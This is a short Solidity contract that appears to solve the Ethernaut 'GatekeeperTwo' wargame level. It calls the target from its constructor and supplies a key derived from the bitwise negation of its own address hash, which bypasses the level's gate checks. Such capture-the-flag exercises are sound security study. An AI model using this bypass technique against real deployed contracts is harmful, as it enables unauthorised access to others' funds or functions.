// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IGatekeeperTwo {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address _gatekeeperTwo) {
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        IGatekeeperTwo gatekeeperTwo = IGatekeeperTwo(_gatekeeperTwo);
        gatekeeperTwo.enter(key);
    }
}